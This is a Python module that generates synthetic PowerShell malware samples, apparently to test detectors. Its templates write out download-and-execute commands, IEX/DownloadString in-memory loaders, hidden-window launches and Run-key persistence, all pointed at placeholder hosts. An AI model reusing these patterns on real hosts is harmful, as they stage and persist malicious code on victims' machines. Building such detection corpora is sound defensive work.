"""Synthetic PowerShell malware-source templates for detector evaluation.

This module emits *text only*.  No builder executes PowerShell, touches the
filesystem or network, or embeds a real payload.  Every endpoint is a reserved
documentation host from RFC 2606/6761, every literal address is TEST-NET, and
every staged filename is an obvious placeholder (``stage2.bin``,
``svchost32.exe``).  Persistence artefacts point at per-user temp/appdata
locations and execution targets stop at ``calc.exe``/``notepad.exe``.

The builders are deliberately varied so a detector sees realistic one-liners,
structured parameterised scripts and long multi-function stagers.  All
randomness comes from the caller-supplied ``random.Random`` instance, so the
same seed always produces the same corpus.
"""
from __future__ import annotations

import base64
import random
import string
import textwrap

# ---------------------------------------------------------------------------
# Security-relevant constants.  Keep every value inside the allowed corpus
# envelope: documentation domains, TEST-NET addresses, benign file names.
# ---------------------------------------------------------------------------

DOMAINS = (
    "example.com",
    "example.net",
    "example.org",
    "contoso.com",
    "adatum.com",
    "internal.corp",
    "localhost",
)

IP_PREFIXES = ("192.0.2.", "198.51.100.", "203.0.113.")

URL_LEAVES = (
    "stage2.ps1",
    "stage1.ps1",
    "payload.bin",
    "stage2.bin",
    "update.dat",
    "updater.ps1",
    "assets/update.dat",
    "cdn/stage2.bin",
    "downloads/payload.bin",
)

PAYLOAD_NAMES = (
    "svchost32.exe",
    "updater.exe",
    "stage2.bin",
    "payload.bin",
    "update.dat",
    "stage1.bin",
    "svcupdate.exe",
)

SCRIPT_NAMES = (
    "updater.ps1",
    "stage2.ps1",
    "payload.ps1",
    "loader.ps1",
)

LOG_NAMES = (
    "stage.log",
    "transfer.log",
    "recon.log",
    "report.txt",
    "telemetry.json",
)

CSV_NAMES = (
    "users.csv",
    "computers.csv",
    "groups.csv",
    "sweep.csv",
    "targets.csv",
    "recon.csv",
)

JSON_NAMES = (
    "telemetry.json",
    "stage_report.json",
    "recon.json",
    "profile.json",
)

RUN_KEY = r"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
RUN_KEY_CMD = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

VALUE_NAMES = (
    "WindowsUpdateHelper",
    "SecurityHealth",
    "OneDriveSync",
    "RuntimeBroker",
    "SvcHost",
    "UpdaterService",
    "SystemGuard",
    "WindowsTelemetry",
)

TASK_NAMES = (
    "UpdaterTask",
    "WindowsUpdateCheck",
    "SecurityHealthService",
    "RuntimeBrokerTask",
    "SystemMaintenance",
    "TelemetryUpload",
)

# Variable-name pools.  54 distinct, plausible PascalCase identifiers.
URL_VARS = ("Stage2Url", "Stage1Url", "PayloadUrl", "DownloadUrl", "RemoteUrl",
            "TargetUrl", "TransferUrl", "FetchUrl")
PATH_VARS = ("OutputPath", "PayloadPath", "DropPath", "Stage2Path", "LocalPath",
             "WorkingPath", "AssemblyPath", "ReportPath", "LogPath")
CLIENT_VARS = ("WebClientObject", "HttpClientObject", "ClientObject",
               "TransferClient", "RequestClient")
TIMEOUT_VARS = ("TimeoutSec", "TransferTimeout", "RequestTimeout",
                "StageTimeout", "ConnectionTimeout")
RESULT_VARS = ("StageResult", "ResultObject", "TransferResult", "FetchResult",
               "OperationResult")
ENCODE_VARS = ("EncodedBlob", "EncodedCommand", "Base64Text", "ScriptPayload",
               "EncodedStage")
MISC_VARS = ("RetryCount", "RetryDelay", "UserAgent", "TaskName", "RunKeyPath",
             "RegistryValue", "TargetHost", "RemotePort", "DomainName",
             "ComputerName", "ProcessList", "HeaderTable", "ServiceList",
             "TempDirectory", "StageMarker", "AssemblyBytes", "ScriptText")

PAYLOAD_PATH_VARS = ("OutputPath", "PayloadPath", "DropPath", "Stage2Path",
                     "LocalPath", "WorkingPath", "DownloadPath")
SCRIPT_PATH_VARS = ("ScriptPath", "StageScriptPath", "LauncherPath",
                    "PersistencePath")
LOG_PATH_VARS = ("LogPath", "TracePath", "ActivityLog", "StageLog")
RETRY_VARS = ("RetryCount", "RetryAttempts", "MaxAttempts")
DELAY_VARS = ("RetryDelay", "RetryDelaySeconds", "BackoffSeconds")
AGENT_VARS = ("UserAgent", "RequestAgent", "BrowserAgent")

FUNCTION_NAMES = (
    "Invoke-Stage2Download",
    "Invoke-PayloadFetch",
    "Get-Stage2Payload",
    "Start-Stage2Loader",
    "Resolve-StageEndpoint",
    "Invoke-HttpTransfer",
    "Get-StagePayload",
    "Invoke-RemoteTransfer",
    "Export-StageReport",
    "Test-EndpointReachability",
    "Get-SystemProfile",
    "Invoke-ScanReport",
)

EXTRA_POOL = (
    "Start-Sleep -Seconds {n}",
    '$ProgressPreference = "SilentlyContinue"',
    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12",
    "Set-Location -Path $env:TEMP",
    '$Host.UI.RawUI.WindowTitle = "Windows Update"',
    'Write-Verbose "stage marker {n} reached"',
    'Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\\stage.log" -Append',
    '$null = New-Item -ItemType Directory -Path "$env:TEMP\\stage" -Force',
    'Remove-Item -Path "$env:TEMP\\stage2.bin" -Force',
    '$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"',
    'Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3',
    '$StageMarker = "stage-{n}"',
    'Write-Output "stage {n} initialized"',
)

VERBOSE_LINES = (
    "Starting workflow",
    "Resolving configured target",
    "Preparing working directory",
    "Checking local path",
    "Reading configuration values",
    "Applying operation timeout",
    "Writing diagnostic marker",
    "Operation completed",
    "Validating result",
    "Collecting host metadata",
    "Inspecting process list",
    "Exporting operation report",
    "Retry budget remaining",
    "Stage handoff finished",
    "Cleaning temporary marker",
)

PAD_NOTES = (
    "Stage timeouts are expressed in seconds.",
    "Retries use a fixed delay to keep the flow deterministic.",
    "The transfer is validated before the next stage starts.",
    "Diagnostic output is written under the per-user temp directory.",
    "All paths are resolved relative to the current user context.",
    "Errors are surfaced as warnings instead of terminating the flow.",
    "The endpoint list is intentionally small.",
    "The launcher uses the default shell host.",
    "Only staged artefacts are referenced.",
    "Host metadata is collected for reporting only.",
)


# ---------------------------------------------------------------------------
# Small, deterministic primitives.
# ---------------------------------------------------------------------------

def _pick(rng: random.Random, seq):
    """Pick one element using only *rng* (never the random module)."""
    return seq[rng.randrange(len(seq))]


def _bucket(rng: random.Random) -> str:
    """Length mix: 55% terse, 30% medium, 15% long."""
    x = rng.random()
    if x < 0.55:
        return "short"
    if x < 0.85:
        return "medium"
    return "long"


def _profile(rng: random.Random, bucket: str, param_bias: float = 0.0,
             comment_bias: float = 0.0) -> dict:
    """Per-sample AI-tell switches, near the corpus-wide target rates."""
    param_p = {"short": 0.20, "medium": 0.65, "long": 0.95}[bucket] + param_bias
    comment_p = {"short": 0.50, "medium": 0.55, "long": 0.80}[bucket] + comment_bias
    try_p = {"short": 0.15, "medium": 0.65, "long": 0.85}[bucket]
    return {
        "comments": rng.random() < min(0.95, comment_p),
        "param": rng.random() < min(0.98, param_p),
        "trycatch": rng.random() < try_p,
        "ea": rng.random() < 0.40,
    }


def _q(rng: random.Random, text: str, style: str | None = None) -> str:
    """PowerShell-quote *text*, varying single vs double quotes."""
    style = style or rng.choice(("'", '"'))
    if style == "'":
        return "'" + text.replace("'", "''") + "'"
    return '"' + text.replace("`", "``").replace('"', '`"') + '"'


def _dq(text: str) -> str:
    """Double-quote a PowerShell fragment, keeping ``$env:`` expansion."""
    return '"' + text.replace("`", "``").replace('"', '`"') + '"'


def _ip(rng: random.Random) -> str:
    if rng.random() < 0.10:
        return "127.0.0.1"
    return _pick(rng, IP_PREFIXES) + str(rng.randint(2, 250))


SCAN_PORTS = (21, 22, 25, 53, 80, 110, 135, 139, 143, 443, 445,
              587, 993, 3389, 5985, 8080, 8443, 9001)


def _port(rng: random.Random) -> int:
    return _pick(rng, SCAN_PORTS)


def _url(rng: random.Random, leaf: str | None = None) -> str:
    scheme = _pick(rng, ("http", "https"))
    leaf = leaf or _pick(rng, URL_LEAVES)
    if rng.random() < 0.18:
        host = _ip(rng)
    else:
        host = _pick(rng, DOMAINS)
    if host == "localhost":
        authority = host + ":" + str(_pick(rng, (8000, 8080, 8081, 9001)))
    elif rng.random() < 0.35:
        port = _pick(rng, (443, 8443)) if scheme == "https" else _pick(rng, (80, 8080))
        authority = host + ":" + str(port)
    else:
        authority = host
    return scheme + "://" + authority + "/" + leaf


def _artifact(rng: random.Random, kind: str = "payload") -> tuple[str, str]:
    """Return ``(powershell_expression, raw_path)`` for a benign drop path."""
    if kind == "script":
        name = _pick(rng, SCRIPT_NAMES)
    elif kind == "log":
        name = _pick(rng, LOG_NAMES)
    elif kind == "csv":
        name = _pick(rng, CSV_NAMES)
    elif kind == "json":
        name = _pick(rng, JSON_NAMES)
    else:
        name = _pick(rng, PAYLOAD_NAMES)
    root = _pick(rng, ("$env:TEMP", "$env:APPDATA", r"C:\ProgramData"))
    raw = root + "\\" + name
    if root.startswith("C:"):
        # No environment expansion is needed for ProgramData.
        expr = "'" + raw + "'" if rng.random() < 0.5 else '"' + raw + '"'
    else:
        expr = '"' + raw + '"'
    return expr, raw


def _log_expr(rng: random.Random, leaf: str | None = None) -> str:
    """A double-quoted temp log path (env vars must expand)."""
    leaf = leaf or _pick(rng, LOG_NAMES)
    return '"$env:TEMP\\' + leaf + '"'


def _token(rng: random.Random, n: int = 6) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(rng.choice(alphabet) for _ in range(n))


def _indent(lines, n: int = 4):
    pad = " " * n
    return [pad + line if line else line for line in lines]


def _help_block(rng: random.Random, synopsis: str, description,
                notes=None) -> list[str]:
    lines = ["<#", ".SYNOPSIS", "    " + synopsis]
    lines += ["", ".DESCRIPTION"]
    for paragraph in description:
        lines.append("    " + paragraph)
    if notes:
        lines += ["", ".NOTES"]
        for note in notes:
            lines.append("    " + note)
    if rng.random() < 0.45:
        lines += ["", ".EXAMPLE",
                  "    PS> .\\" + _pick(rng, SCRIPT_NAMES)]
    lines.append("#>")
    return lines


def _section(rng: random.Random, text: str) -> list[str]:
    return ["# " + text]


def _param_block(rng: random.Random, entries, mandatory: bool = False) -> list[str]:
    """entries: list of ``(type, variable, default_expression)``."""
    lines = ["[CmdletBinding()]", "param("]
    for i, (typ, var, value) in enumerate(entries):
        if i == 0 and mandatory:
            lines.append("    [Parameter(Mandatory = $true)]")
        comma = "," if i < len(entries) - 1 else ""
        lines.append("    [" + typ + "]$" + var + " = " + value + comma)
    lines.append(")")
    return lines


def _config(rng: random.Random, entries, use_param: bool,
            mandatory: bool = False) -> list[str]:
    if use_param:
        return _param_block(rng, entries, mandatory=mandatory)
    return ["$" + var + " = " + value for _, var, value in entries]


def _function(rng: random.Random, name: str, params, body,
              comment: list[str] | None = None) -> list[str]:
    lines = []
    if comment:
        lines += comment
    lines.append("function " + name + " {")
    inner = []
    if params:
        if rng.random() < 0.72:
            inner.append("[CmdletBinding()]")
        inner.append("param(")
        for i, (typ, var, default) in enumerate(params):
            comma = "," if i < len(params) - 1 else ""
            inner.append("    [" + typ + "]$" + var + " = " + default + comma)
        inner.append(")")
        inner.append("")
    inner += body
    lines += _indent(inner)
    lines.append("}")
    return lines


def _try_catch(rng: random.Random, body, message: str | None = None) -> list[str]:
    if message is None:
        message = _pick(rng, ("Stage operation failed", "Transfer failed",
                              "Remote call failed", "Loader step failed"))
    lines = ["try {"]
    lines += _indent(body)
    lines += ["}", "catch {"]
    lines += _indent(['Write-Warning "' + message + ': $($_.Exception.Message)"'])
    lines.append("}")
    return lines


def _extras(rng: random.Random, count: int | None = None) -> list[str]:
    count = count if count is not None else rng.randint(1, 3)
    count = max(1, min(3, count))
    picks = rng.sample(EXTRA_POOL, count)
    return [p.replace("{n}", str(rng.randint(2, 45))) for p in picks]


def _verbose_tail(rng: random.Random, count: int | None = None) -> list[str]:
    count = count if count is not None else rng.randint(6, 12)
    count = max(1, min(count, len(VERBOSE_LINES)))
    return ['Write-Verbose "' + m + '"' for m in rng.sample(VERBOSE_LINES, count)]


def _inline_comment(rng: random.Random) -> str:
    topics = ("Stage transfer", "Payload staging", "Remote fetch",
              "Staged execution", "Host profiling", "Loader bootstrap")
    return "<# " + _pick(rng, topics) + " #> "


def _short_script(rng: random.Random, statements, comments: bool) -> str:
    """Render a terse sample as one semicolon line or a short multi-line block."""
    statements = [s.strip().rstrip(";") for s in statements if s.strip()]
    if not statements:
        statements = ['Write-Verbose "stage ready"']
    single = rng.random() < 0.70 or len(statements) > 6
    if single:
        body = "; ".join(statements)
        if comments:
            body = _inline_comment(rng) + body
        return body
    body = "\n".join(statements)
    if comments:
        body = "# " + _pick(rng, ("Stage helper", "Payload transfer",
                                  "Encoded launcher", "Remote staging")) + "\n" + body
    return body


def _short_param_script(rng: random.Random, entries, core, comments: bool) -> str:
    """Compact param-block form for short samples."""
    lines = _param_block(rng, entries)
    lines += core
    text = "\n".join(lines)
    if comments:
        text = _inline_comment(rng).rstrip() + "\n" + text
    return text


def _pad_to(lines: list[str], rng: random.Random, minimum: int) -> list[str]:
    """Append a small notes section if a long template came out short."""
    if len(lines) >= minimum:
        return lines
    lines = list(lines)
    lines += ["", "# Operational notes"]
    while len(lines) < minimum:
        lines.append("# " + _pick(rng, PAD_NOTES))
    return lines


def _coerce_long(lines: list[str], rng: random.Random) -> str:
    return "\n".join(_pad_to(lines, rng, 60))


def _coerce_medium(lines: list[str], rng: random.Random) -> str:
    lines = list(lines)
    while len(lines) < 15:
        lines += _verbose_tail(rng, 1)
    return "\n".join(lines)


def _join_catch(rng: random.Random, statements) -> list[str]:
    """Wrap a one-line statement list in try/catch, still on one line."""
    msg = _pick(rng, ("Stage transfer failed", "Remote fetch failed",
                      "Loader step failed"))
    return ["try { " + "; ".join(statements) + ' } catch { Write-Warning "' + msg + '" }']


def _run_value_expr(path_expr: str) -> str:
    """A Run-key value that launches a script through powershell.exe."""
    return "('powershell.exe -NoP -WindowStyle Hidden -File \"' + " + path_expr + " + '\"')"


def _ps_file_command(raw: str) -> str:
    """A PowerShell command line that launches *raw* hidden, for samples."""
    return 'powershell.exe -NoP -WindowStyle Hidden -File `"' + raw + '`"'


def _b64(text: str, utf16: bool = True) -> str:
    data = text.encode("utf-16-le" if utf16 else "utf-8")
    return base64.b64encode(data).decode("ascii")


NATIVE_CS = textwrap.dedent(
    """\
    using System;
    using System.Runtime.InteropServices;

    public static class NativeApi
    {
        [DllImport("kernel32.dll")]
        public static extern uint GetTickCount();

        [DllImport("kernel32.dll")]
        public static extern uint GetCurrentProcessId();
    }
    """
).rstrip()


# === BUILDERS ===


def build_downloader_oneliner(rng: random.Random) -> str:
    """Terse and structured download-and-launch samples."""
    bucket = _bucket(rng)
    p = _profile(rng, bucket)
    url = _url(rng)
    url_v = _pick(rng, URL_VARS)
    path_v = _pick(rng, PAYLOAD_PATH_VARS)
    timeout_v = _pick(rng, TIMEOUT_VARS)
    result_v = _pick(rng, RESULT_VARS)
    retry_v = _pick(rng, RETRY_VARS)
    delay_v = _pick(rng, DELAY_VARS)
    agent_v = _pick(rng, AGENT_VARS)
    timeout = rng.randint(10, 240)
    retry = rng.randint(1, 5)
    delay = rng.randint(1, 20)
    url_q = _q(rng, url)
    path_expr, path_raw = _artifact(rng, "payload")
    ea = " -ErrorAction SilentlyContinue" if p["ea"] else ""

    if bucket == "short":
        if p["param"]:
            entries = [("string", url_v, url_q), ("string", path_v, path_expr)]
            launch_expr = ("$" + path_v) if path_raw.lower().endswith(".exe") else _q(rng, "calc.exe")
            core = [
                "(New-Object System.Net.WebClient).DownloadFile($" + url_v + ", $" + path_v + ")",
                "Start-Process -FilePath " + launch_expr + " -WindowStyle Hidden" + ea,
            ]
            core += _extras(rng, 1)
            if p["trycatch"]:
                core = _join_catch(rng, core)
            return _short_param_script(rng, entries, core, p["comments"])
        use_vars = rng.random() < 0.75
        statements = []
        if use_vars:
            statements.append("$" + url_v + " = " + url_q)
            statements.append("$" + path_v + " = " + path_expr)
            src, dst = "$" + url_v, "$" + path_v
        else:
            src, dst = url_q, path_expr
        transfer = _pick(rng, (
            "(New-Object System.Net.WebClient).DownloadFile(" + src + ", " + dst + ")",
            "Invoke-WebRequest -Uri " + src + " -OutFile " + dst + " -UseBasicParsing" + ea,
            "Start-BitsTransfer -Source " + src + " -Destination " + dst + ea,
            "curl.exe -s -L -o " + dst + " " + src,
        ))
        statements.append(transfer)
        if path_raw.lower().endswith(".exe"):
            launch_target = dst
        else:
            launch_target = _q(rng, _pick(rng, ("calc.exe", "notepad.exe")))
        launch = _pick(rng, (
            "Start-Process -FilePath " + launch_target + " -WindowStyle Hidden" + ea,
            "Start-Process -FilePath " + launch_target + ea,
            "& " + launch_target,
            'Start-Process -FilePath "notepad.exe" -ArgumentList ' + dst + ea,
            "",
        ))
        if launch:
            statements.append(launch)
        statements += _extras(rng, rng.randint(1, 2))
        if p["trycatch"]:
            statements = _join_catch(rng, statements)
        return _short_script(rng, statements, p["comments"])

    if bucket == "medium":
        lines = []
        if p["comments"]:
            lines += _help_block(
                rng,
                "Stage 2 payload transfer helper.",
                ["Downloads the staged artefact to a per-user drop path.",
                 "The destination is verified before the launcher runs."],
            )
        entries = [
            ("string", url_v, url_q),
            ("string", path_v, path_expr),
            ("int", timeout_v, str(timeout)),
            ("string", agent_v, _q(rng, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")),
        ]
        lines += _config(rng, entries, p["param"])
        lines.append('$ErrorActionPreference = "Stop"')
        lines.append("")
        fn = _pick(rng, ("Invoke-Stage2Download", "Invoke-PayloadFetch",
                         "Get-Stage2Payload"))
        body = [
            'Write-Verbose ("Requesting " + $SourceUrl)',
            "$ClientObject = New-Object System.Net.WebClient",
            '$ClientObject.Headers.Add("User-Agent", $UserAgent)',
            '$ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)',
            "$ClientObject.DownloadFile($SourceUrl, $DestinationPath)",
            "return (Test-Path -Path $DestinationPath)",
        ]
        lines += _function(rng, fn, [
            ("string", "SourceUrl", _q(rng, "")),
            ("string", "DestinationPath", _q(rng, "")),
            ("int", "TimeoutSec", "45"),
            ("string", "UserAgent", _q(rng, "Mozilla/5.0")),
        ], body)
        lines.append("")
        main = [
            'Write-Verbose "Starting stage 2 transfer"',
            "$" + result_v + " = " + fn + " -SourceUrl $" + url_v +
            " -DestinationPath $" + path_v + " -TimeoutSec $" + timeout_v +
            " -UserAgent $" + agent_v,
            "if ($" + result_v + ") {",
            "    " + ("Start-Process -FilePath $" + path_v + " -WindowStyle Hidden" + ea
                    if path_raw.lower().endswith(".exe")
                    else 'Start-Process -FilePath "calc.exe" -WindowStyle Hidden' + ea),
            "}",
        ]
        if p["trycatch"]:
            main = _try_catch(rng, main, "Stage 2 transfer failed")
        lines += main
        lines.append("")
        lines += _extras(rng, 2)
        return _coerce_medium(lines, rng)

    # long: three helper functions plus a diagnostic report
    lines = []
    if p["comments"]:
        lines += _help_block(
            rng,
            "Structured stage 2 download and launch workflow.",
            ["Resolves a configured endpoint, downloads the staged artefact",
             "with a bounded retry loop, validates the result and then hands",
             "control to the launcher."],
            notes=["Designed for unattended execution."],
        )
    log_v = _pick(rng, LOG_PATH_VARS)
    entries = [
        ("string", url_v, url_q),
        ("string", path_v, path_expr),
        ("string", log_v, _log_expr(rng)),
        ("string", agent_v, _q(rng, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")),
        ("int", timeout_v, str(timeout)),
        ("int", retry_v, str(retry)),
        ("int", delay_v, str(delay)),
    ]
    lines += _config(rng, entries, p["param"])
    lines.append('$ErrorActionPreference = "Stop"')
    lines.append('$ProgressPreference = "SilentlyContinue"')
    lines.append("")

    lines += _function(
        rng,
        "Write-StageLog",
        [("string", "Message", _q(rng, ""))],
        [
            "Write-Verbose $Message",
            'Add-Content -Path $' + log_v +
            ' -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)',
        ],
        comment=_section(rng, "Diagnostic logging") if p["comments"] else None,
    )
    lines.append("")

    lines += _function(
        rng,
        "Resolve-StageEndpoint",
        [("string", "CandidateUrl", _q(rng, ""))],
        [
            "if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {",
            '    throw "Endpoint URL is empty"',
            "}",
            "$ParsedUri = [System.Uri]$CandidateUrl",
            'Write-Verbose ("Endpoint host: " + $ParsedUri.Host)',
            "return $ParsedUri.AbsoluteUri",
        ],
        comment=_section(rng, "Endpoint resolution") if p["comments"] else None,
    )
    lines.append("")

    lines += _function(
        rng,
        "Invoke-Stage2Download",
        [
            ("string", "SourceUrl", _q(rng, "")),
            ("string", "DestinationPath", _q(rng, "")),
            ("int", "RetryCount", str(retry)),
            ("int", "RetryDelay", str(delay)),
            ("string", "UserAgent", _q(rng, "Mozilla/5.0")),
        ],
        [
            "for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {",
            "    try {",
            "        $ClientObject = New-Object System.Net.WebClient",
            '        $ClientObject.Headers.Add("User-Agent", $UserAgent)',
            "        $ClientObject.DownloadFile($SourceUrl, $DestinationPath)",
            "        return $true",
            "    }",
            "    catch {",
            '        Write-Verbose ("Attempt " + $Attempt + " failed: " + '
            "$" + '_.Exception.Message)',
            "        Start-Sleep -Seconds $RetryDelay",
            "    }",
            "}",
            "return $false",
        ],
        comment=_section(rng, "Retrying transfer") if p["comments"] else None,
    )
    lines.append("")

    main = [
        'Write-StageLog -Message "Starting stage 2 download"',
        "$ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $" + url_v,
        "$" + result_v + " = Invoke-Stage2Download -SourceUrl $ResolvedUrl" +
        " -DestinationPath $" + path_v + " -RetryCount $" + retry_v +
        " -RetryDelay $" + delay_v + " -UserAgent $" + agent_v,
        "if ($" + result_v + ") {",
        '    Write-StageLog -Message "Stage 2 downloaded"',
        "    " + ("Start-Process -FilePath $" + path_v + " -WindowStyle Hidden" + ea
                if path_raw.lower().endswith(".exe")
                else 'Start-Process -FilePath "calc.exe" -WindowStyle Hidden' + ea),
        "}",
        "else {",
        '    Write-Warning "Stage 2 transfer did not complete"',
        "}",
    ]
    if p["trycatch"]:
        main = _try_catch(rng, main, "Structured download failed")
    lines += main
    lines.append("")
    lines += [
        "$DiagnosticReport = [ordered]@{",
        '    Stage = "stage2"',
        "    Endpoint = $" + url_v,
        "    Destination = $" + path_v,
        "    RetryCount = $" + retry_v,
        "    TimeoutSec = $" + timeout_v,
        "}",
        "$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $" +
        log_v + " -Append",
    ]
    lines += _verbose_tail(rng)
    lines += _extras(rng, rng.randint(1, 3))
    return _coerce_long(lines, rng)


def build_structured_downloader(rng: random.Random) -> str:
    """Parameterised, multi-stage downloader with helper functions."""
    bucket = _bucket(rng)
    p = _profile(rng, bucket, param_bias=0.30, comment_bias=0.05)
    stage1 = _url(rng, "stage1.ps1")
    stage2 = _url(rng, "stage2.bin")
    url_v = _pick(rng, URL_VARS)
    path_v = _pick(rng, PAYLOAD_PATH_VARS)
    timeout_v = _pick(rng, TIMEOUT_VARS)
    result_v = _pick(rng, RESULT_VARS)
    timeout = rng.randint(10, 240)
    path_expr, path_raw = _artifact(rng, "payload")
    url_q = _q(rng, stage1)
    ea = " -ErrorAction SilentlyContinue" if p["ea"] else ""

    if bucket == "short":
        entries = [
            ("string", url_v, url_q),
            ("string", path_v, path_expr),
            ("int", timeout_v, str(timeout)),
        ]
        core = []
        if rng.random() < 0.5:
            core.append("Invoke-WebRequest -Uri $" + url_v + " -OutFile $" +
                        path_v + " -UseBasicParsing" + ea)
        else:
            core.append("Start-BitsTransfer -Source $" + url_v +
                        " -Destination $" + path_v + ea)
        core.append('Start-Process -FilePath "calc.exe" -WindowStyle Hidden' + ea)
        core += _extras(rng, rng.randint(1, 2))
        if p["trycatch"]:
            core = _join_catch(rng, core)
        if p["param"]:
            lines = _param_block(rng, entries)
            lines += core
            text = "\n".join(lines)
            if p["comments"]:
                text = _inline_comment(rng).rstrip() + "\n" + text
            return text
        statements = ["$" + v + " = " + val for _, v, val in entries]
        statements += core
        return _short_script(rng, statements, p["comments"])

    if bucket == "medium":
        lines = []
        if p["comments"]:
            lines += _help_block(
                rng,
                "Two-stage payload retrieval helper.",
                ["Fetches the first stage into a per-user working path and",
                 "starts the staged loader after a basic existence check."],
            )
        entries = [
            ("string", url_v, url_q),
            ("string", path_v, path_expr),
            ("int", timeout_v, str(timeout)),
        ]
        lines += _config(rng, entries, p["param"], mandatory=rng.random() < 0.35)
        lines.append('$ErrorActionPreference = "Stop"')
        lines.append("")
        fn = _pick(rng, ("Invoke-Stage1Download", "Invoke-StageDownload",
                         "Get-Stage1Payload"))
        lines += _function(rng, fn, [
            ("string", "SourceUrl", _q(rng, "")),
            ("string", "DestinationPath", _q(rng, "")),
            ("int", "TimeoutSec", "45"),
        ], [
            'Write-Verbose ("Fetching " + $SourceUrl)',
            "$ClientObject = New-Object System.Net.WebClient",
            '$ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)',
            "$ClientObject.DownloadFile($SourceUrl, $DestinationPath)",
            "return (Test-Path -Path $DestinationPath)",
        ])
        lines.append("")
        main = [
            'Write-Verbose "Beginning first stage"',
            "$" + result_v + " = " + fn + " -SourceUrl $" + url_v +
            " -DestinationPath $" + path_v + " -TimeoutSec $" + timeout_v,
            "if ($" + result_v + ") {",
            '    Start-Process -FilePath "calc.exe" -WindowStyle Hidden' + ea,
            "}",
        ]
        if p["trycatch"]:
            main = _try_catch(rng, main, "Stage 1 retrieval failed")
        lines += main
        lines += _extras(rng, rng.randint(1, 3))
        return _coerce_medium(lines, rng)

    # long: two helpers, one for each stage, plus a report block
    lines = []
    if p["comments"]:
        lines += _help_block(
            rng,
            "Multi-stage download and handoff workflow.",
            ["Downloads a first-stage script, verifies the drop path, then",
             "invokes a second-stage helper that performs the handoff.",
             "Both stages share the same bounded timeout and retry policy."],
            notes=["Intended for controlled endpoint testing."],
        )
    log_v = _pick(rng, LOG_PATH_VARS)
    entries = [
        ("string", url_v, url_q),
        ("string", path_v, path_expr),
        ("string", log_v, _log_expr(rng)),
        ("int", timeout_v, str(timeout)),
    ]
    lines += _config(rng, entries, p["param"], mandatory=rng.random() < 0.4)
    lines.append('$ErrorActionPreference = "Stop"')
    lines.append('$ProgressPreference = "SilentlyContinue"')
    lines.append("")

    lines += _function(
        rng,
        "Invoke-Stage1Download",
        [
            ("string", "SourceUrl", _q(rng, "")),
            ("string", "DestinationPath", _q(rng, "")),
            ("int", "TimeoutSec", str(timeout)),
        ],
        [
            'Write-Verbose ("Downloading first stage from " + $SourceUrl)',
            "$ClientObject = New-Object System.Net.WebClient",
            '$ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)',
            "$ClientObject.DownloadFile($SourceUrl, $DestinationPath)",
            "if (-not (Test-Path -Path $DestinationPath)) {",
            '    throw "First stage was not written to disk"',
            "}",
            "return $DownloadedPath = $DestinationPath",
        ],
        comment=_section(rng, "First stage") if p["comments"] else None,
    )
    lines.append("")

    lines += _function(
        rng,
        "Invoke-Stage2Execution",
        [
            ("string", "StagedPath", _q(rng, "")),
            ("int", "DelaySeconds", "2"),
        ],
        [
            'Write-Verbose ("Preparing handoff for " + $StagedPath)',
            "Start-Sleep -Seconds $DelaySeconds",
            'Start-Process -FilePath "calc.exe" -WindowStyle Hidden' + ea,
            'Write-Verbose "Second stage handoff complete"',
            "return $true",
        ],
        comment=_section(rng, "Second stage") if p["comments"] else None,
    )
    lines.append("")

    main = [
        'Write-Verbose "Starting multi-stage workflow"',
        "$" + result_v + " = Invoke-Stage1Download -SourceUrl $" + url_v +
        " -DestinationPath $" + path_v + " -TimeoutSec $" + timeout_v,
        "if ($" + result_v + ") {",
        "    $HandoffResult = Invoke-Stage2Execution -StagedPath $" + path_v,
        '    Write-Verbose ("Handoff result: " + $HandoffResult)',
        "}",
        "else {",
        '    Write-Warning "First stage did not complete"',
        "}",
    ]
    if p["trycatch"]:
        main = _try_catch(rng, main, "Multi-stage workflow failed")
    lines += main
    lines.append("")
    lines += [
        "$StageSummary = [ordered]@{",
        '    Stage1 = "download"',
        '    Stage2 = "handoff"',
        "    Endpoint = $" + url_v,
        "    Destination = $" + path_v,
        "    TimeoutSec = $" + timeout_v,
        "}",
        "$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $" +
        log_v + " -Append",
    ]
    lines += _verbose_tail(rng)
    lines += _extras(rng, rng.randint(1, 3))
    return _coerce_long(lines, rng)


def build_iex_downloadstring(rng: random.Random) -> str:
    """IEX / DownloadString style in-memory script loaders."""
    bucket = _bucket(rng)
    p = _profile(rng, bucket)
    url = _url(rng, "stage2.ps1")
    url_v = _pick(rng, URL_VARS)
    script_v = _pick(rng, ("ScriptText", "StageScript", "RemoteScript",
                           "PayloadText", "DownloadedScript"))
    timeout_v = _pick(rng, TIMEOUT_VARS)
    result_v = _pick(rng, RESULT_VARS)
    timeout = rng.randint(10, 180)
    url_q = _q(rng, url)
    ea = " -ErrorAction SilentlyContinue" if p["ea"] else ""

    if bucket == "short":
        if p["param"]:
            entries = [("string", url_v, url_q), ("int", timeout_v, str(timeout))]
            core = ["IEX (Invoke-WebRequest -Uri $" + url_v +
                    " -UseBasicParsing).Content"]
            core += _extras(rng, 1)
            if p["trycatch"]:
                core = _join_catch(rng, core)
            return _short_param_script(rng, entries, core, p["comments"])
        use_vars = rng.random() < 0.7
        statements = []
        if use_vars:
            statements.append("$" + url_v + " = " + url_q)
            source = "$" + url_v
        else:
            source = url_q
        variant = rng.randrange(5)
        if variant == 0:
            statements.append("$" + script_v +
                              " = (New-Object System.Net.WebClient).DownloadString(" +
                              source + ")")
            statements.append("IEX $" + script_v)
        elif variant == 1:
            statements.append("IEX (Invoke-WebRequest -Uri " + source +
